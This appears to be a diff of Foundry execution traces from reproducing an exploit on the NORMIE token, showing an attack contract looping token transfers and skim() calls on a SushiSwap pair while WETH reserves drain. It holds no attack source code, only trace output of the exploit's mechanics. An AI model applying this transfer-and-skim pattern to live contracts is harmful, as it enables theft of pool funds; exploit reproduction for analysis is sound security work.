-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000762a4ece62c465 → 0x000000000000000000000000000000000000000000000000008654823c1d2465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000104a6ddc13c760 → 0x0000000000000000000000000000000000000000000000000000203a6e596760
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000762a4ece62c465 → 0x000000000000000000000000000000000000000000000000008654823c1d2465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 79593822534238204348 [7.959e19], 33260565210252389 [3.326e16], 1716694911 [1.716e9]
@@ -562,8 +470,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 9552775268687871919 [9.552e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 9552775268687871919 [9.552e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x00000000000000000000000000000000000000000000000450960fe384bff1bc → 0x000000000000000000000000000000000000000000000003cc03c9650778f20d
     │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000008492467e7d46ffaf
+    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x00000000000000000000000000000000000000000000000450960fe384bff1bc → 0x000000000000000000000000000000000000000000000003cc03c9650778f20d
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 70041047265550332429 [7.004e19]
@@ -596,8 +504,8 @@ Traces:
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008654823c1d2465 → 0x000000000000000000000000000000000000000000000000008e61fec2c9da34
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -612,8 +520,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008e61fec2c9da34 → 0x000000000000000000000000000000000000000000000000008654823c1d2465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008e61fec2c9da34 → 0x000000000000000000000000000000000000000000000000008654823c1d2465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000000203a6e596760 → 0x00000000000000000000000000000000000000000000000000082db6f5061d2f
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -622,8 +530,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008654823c1d2465 → 0x000000000000000000000000000000000000000000000000008e61fec2c9da34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008654823c1d2465 → 0x000000000000000000000000000000000000000000000000008e61fec2c9da34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -638,9 +546,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008e61fec2c9da34 → 0x000000000000000000000000000000000000000000000000008654823c1d2465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000082db6f5061d2f → 0x00000000000000000000000000000000000000000000000000103b337bb2d2fe
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008e61fec2c9da34 → 0x000000000000000000000000000000000000000000000000008654823c1d2465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -656,8 +564,8 @@ Traces:
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000103b337bb2d2fe → 0x000000000000000000000000000000000000000000000000000011000df872fe
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000008654823c1d2465 → 0x00000000000000000000000000000000000000000000000000967eb5a9d78465
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000103b337bb2d2fe → 0x000000000000000000000000000000000000000000000000000011000df872fe
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 70041047265550332429 [7.004e19], 37810565210252389 [3.781e16], 1716694911 [1.716e9]
@@ -667,8 +575,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 7503042504644001555 [7.503e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 7503042504644001555 [7.503e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x00000000000000000000000000000000000000000000000068202967b7f67f13
     │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x000000000000000000000000000000000000000000000003cc03c9650778f20d → 0x00000000000000000000000000000000000000000000000363e39ffd4f8272fa
+    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x00000000000000000000000000000000000000000000000068202967b7f67f13
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 62538004760906330874 [6.253e19]
@@ -700,9 +608,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000967eb5a9d78465 → 0x000000000000000000000000000000000000000000000000009e8c3230843a34
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -717,8 +625,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000011000df872fe → 0x00000000000000000000000000000000000000000000000000081e7c94a528cd
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000009e8c3230843a34 → 0x00000000000000000000000000000000000000000000000000967eb5a9d78465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000011000df872fe → 0x00000000000000000000000000000000000000000000000000081e7c94a528cd
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -727,8 +635,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000967eb5a9d78465 → 0x000000000000000000000000000000000000000000000000009e8c3230843a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000967eb5a9d78465 → 0x000000000000000000000000000000000000000000000000009e8c3230843a34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -743,9 +651,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000081e7c94a528cd → 0x00000000000000000000000000000000000000000000000000102bf91b51de9c
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000009e8c3230843a34 → 0x00000000000000000000000000000000000000000000000000967eb5a9d78465
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000081e7c94a528cd → 0x00000000000000000000000000000000000000000000000000102bf91b51de9c
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -760,9 +668,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000102bf91b51de9c → 0x000000000000000000000000000000000000000000000000000001c5ad977e9c
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000967eb5a9d78465 → 0x00000000000000000000000000000000000000000000000000a6a8e91791e465
+    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 62538004760906330874 [6.253e19], 42360565210252389 [4.236e16], 1716694911 [1.716e9]
@@ -772,8 +680,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 6049316391606019519 [6.049e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 6049316391606019519 [6.049e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x00000000000000000000000000000000000000000000000053f37d351f9fe5bf
     │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x00000000000000000000000000000000000000000000000363e39ffd4f8272fa → 0x0000000000000000000000000000000000000000000000030ff022c82fe28d3b
+    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x00000000000000000000000000000000000000000000000053f37d351f9fe5bf
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 56488688369300311355 [5.648e19]
@@ -805,9 +713,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000a6a8e91791e465 → 0x00000000000000000000000000000000000000000000000000aeb6659e3e9a34
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -822,9 +730,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000001c5ad977e9c → 0x00000000000000000000000000000000000000000000000000080f423444346b
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000aeb6659e3e9a34 → 0x00000000000000000000000000000000000000000000000000a6a8e91791e465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -858,8 +766,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000a6a8e91791e465 → 0x00000000000000000000000000000000000000000000000000aeb6659e3e9a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -874,9 +782,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000101cbebaf0ea3a → 0x00000000000000000000000000000000000000000000000000182a3b419da009
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000aeb6659e3e9a34 → 0x00000000000000000000000000000000000000000000000000a6a8e91791e465
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -891,9 +799,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000a6a8e91791e465 → 0x00000000000000000000000000000000000000000000000000b6d31c854c4465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000182a3b419da009 → 0x00000000000000000000000000000000000000000000000000080007d3e34009
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000a6a8e91791e465 → 0x00000000000000000000000000000000000000000000000000b6d31c854c4465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 56488688369300311355 [5.648e19], 46910565210252389 [4.691e16], 1716694911 [1.716e9]
@@ -979,9 +887,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000100d845a8ff5d8 → 0x00000000000000000000000000000000000000000000000000181b00e13caba7
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000bee0990bf8fa34 → 0x00000000000000000000000000000000000000000000000000b6d31c854c4465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000100d845a8ff5d8 → 0x00000000000000000000000000000000000000000000000000181b00e13caba7
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -997,8 +905,8 @@ Traces:
